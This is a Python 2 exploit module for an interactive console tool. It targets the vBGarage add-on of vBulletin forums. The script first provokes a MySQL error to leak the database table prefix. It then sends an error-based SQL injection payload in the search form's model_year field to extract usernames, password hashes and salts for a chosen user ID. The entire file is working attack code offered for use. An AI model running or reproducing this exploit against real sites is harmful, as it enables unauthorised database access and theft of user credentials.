#!/usr/bin/env python
from includes.termcolor import colored
import urllib
import httplib
import pycurl
import cStringIO
import re
import HTMLParser
import urlparse

def get_server_status_code(url):
    host, path = urlparse.urlparse(url)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request('HEAD', path)
        return conn.getresponse().status
    except StandardError:
        return False
 
def check_url(url):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(url) in good_codes

def get_table_prefix(url):
	postdata = [
	('securitytoken', 'guest'),
	('s', ''),
	('searchuser', ''),
	('search_year', '1'),
	('model_year', """'"""),
	('make_id', ''),
	('model_id', ''),
	('trim_id', ''),
	('club_id', ''),
	('category_id', ''),
	('engine_type', ''),
	('veh_class', ''),
	('manufact_id', ''),
	('product_id', ''),
	('search_logic', 'any'),
	('do', 'search_results'),
	('submit', 'Search')
	]
	postdata = urllib.urlencode(postdata)
	buf = cStringIO.StringIO()
	c = pycurl.Curl()
	c.setopt(c.URL, url)
	c.setopt(c.POSTFIELDS, postdata)
	c.setopt(c.WRITEFUNCTION, buf.write)
	c.perform()
	response = buf.getvalue()
	if 'MySQL Error' in response:
		prefix = re.search('FROM(.*)garage_user_vehicle', response).group(1).strip()
		if len(prefix) != 0:
			print ('Table prefix found: '+prefix)
		else:
			print ('No table prefix was found.')
	else:
		print ('The exploit was unsuccessful. Therefore no prefix was found.')
		print ('Check all vars and make sure they are correct.')
		print ('If everything is correct the site is either not vuln or they are using a newer vB version.')

def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['TABLE', 'user', 'User table to extract data from'],
	['USERID', '1', 'Userid of to extract data for'],
	['COLUMNS', 'username,password,salt', 'Columns to extract data for. Seperate with a comma!!'],
	['SEPERATOR', ':', 'Seperator to seperate columns']
	]

	print ('Type help for more information')
	while True:
		try:
			vbgarageinput = raw_input('vbconsole('+colored('/exploits/vbgarage', 'red')+')> ')
			if vbgarageinput == 'exit':
				print ("Going back to home.")
				break
			elif vbgarageinput == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('run ~> Run the exploit')
				print ('get prefix ~> Will attempt to find a table prefix')
				print ('exit ~> Go back to vBconsole home')
			elif vbgarageinput == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif vbgarageinput[0:3] == 'set':
				setvar = vbgarageinput.split(' ')[1]
				setval = vbgarageinput.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
			elif vbgarageinput == 'get prefix':
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"garage.php?do=search"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"garage.php?do=search"
				else:
					path = exvars[1][1]+"/garage.php?do=search"
				url = host+path
				if check_url(url):
					get_table_prefix(url)
				else:
					print ('vBGarage could not be found at: '+url)
			elif vbgarageinput == 'run':
				columns = exvars[4][1].split(',')
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"garage.php?do=search"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"garage.php?do=search"
				else:
					path = exvars[1][1]+"/garage.php?do=search"
				url = host+path
				if check_url(url):
					results = []
					for cols in columns:
						postdata = [
						('securitytoken', 'guest'),
						('s', ''),
						('searchuser', ''),
						('search_year', '1'),
						('model_year', """') IN (select (1) from (select count(*),concat((select(select concat(cast(concat("""+cols+""") as char),0x7e)) from """+exvars[2][1]+""" where userid = """+exvars[3][1]+""" LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND ''=''#"""),
						('make_id', ''),
						('model_id', ''),
						('trim_id', ''),
						('club_id', ''),
						('category_id', ''),
						('engine_type', ''),
						('veh_class', ''),
						('manufact_id', ''),
						('product_id', ''),
						('search_logic', 'any'),
						('do', 'search_results'),
						('submit', 'Search')
						]
						postdata = urllib.urlencode(postdata)
						buf = cStringIO.StringIO()
						c = pycurl.Curl()
						c.setopt(c.URL, url)
						c.setopt(c.POSTFIELDS, postdata)
						c.setopt(c.WRITEFUNCTION, buf.write)
						c.perform()
						response = buf.getvalue()
						for search in response.split("\n"):
							if 'Duplicate entry' in search:
								result = search.strip()
								result = result.replace('MySQL Error', '')
								result = result.replace('Duplicate entry', '')
								result = result.replace('for key \'group_key\'', '')
								result = result.strip()
								result = result.strip(':')
								result = result.strip()
								result = result.strip('\'')
								code = 0
								break
							elif 'MySQL Error' in search: 
								result = search.strip()
								result = result.replace('MySQL Error', '')
								result = result.strip()
								result = result.strip(':')
								result = result.strip()
								code = 1
								break
							else:
								code = 2
						if code == 0:
							h = HTMLParser.HTMLParser()
							unescaped = h.unescape(result)
							if unescaped.endswith('~1'):
								print (cols+': '+unescaped.strip('~1'))
								results.append(unescaped.strip('~1'))
							elif unescaped.endswith('~'):
								print (cols+': '+unescaped.strip('~'))
								results.append(unescaped.strip('~'))
							else:
								print (cols+': '+unescaped)
								results.append(unescaped)
						elif code == 1:
							print ('MySQL Error: '+result)
						else:
							print ('Exploit was unsuccessful!')
							print ('There could be various reasons for this:')
							print ('The userid you chose could be invalid')
							print ('The host could be incorrect')
							print ('The forum could be running a newer version of vB eliminating DB errors in the source')
							print ('I have also had sites not work without www. during testing')
							break
						buf.close()
					if len(results) != 0:
						line = exvars[5][1].join(results)
						print ('\n'+line)
				else:
					print ('vBGarage could not be found at: '+url)
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
